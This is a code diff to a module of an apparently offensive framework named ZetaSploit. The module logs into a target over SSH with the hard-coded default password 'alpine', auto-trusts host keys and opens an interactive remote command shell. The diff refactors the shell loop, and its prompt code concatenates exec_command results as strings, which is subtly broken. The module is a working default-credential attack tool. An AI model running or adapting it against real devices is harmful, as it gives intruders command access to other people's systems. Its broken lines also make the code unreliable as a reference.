@@ -61,22 +61,33 @@ class ZetaSploitModule:
             }
         }
 
-    def run(self):
+    def shell(self, ssh):
         username = self.options['USERNAME']['Value']
-        remote_host = self.options['RHOST']['Value']
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(remote_host, username=username, password='alpine')
+        if username == "root":
+            prompt = '#'
+        else:
+            prompt = '$'
+        hostname = ssh.exec_command("hostname")
         while True:
             try:
-                command = input('pseudo_shell> ').strip()
+                cwd = ssh.exec_command("pwd")
+                command = input(hostname + ':' + cwd + ' ' + username + prompt + ' ').strip()
                 if command.split() != []:
                     if command.split()[0] == "exit":
                         break
                     else:
                         stdin, stdout, stderr = ssh.exec_command(command)
                         response = stdout.readlines()
-                        print(response)
+                        for resp in response:
+                            self.helper.output(resp)
             except:
-                pass
+                break
+        
+    def run(self):
+        username = self.options['USERNAME']['Value']
+        remote_host = self.options['RHOST']['Value']
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(remote_host, username=username, password='alpine')
+        self.shell(ssh)
         ssh.close()
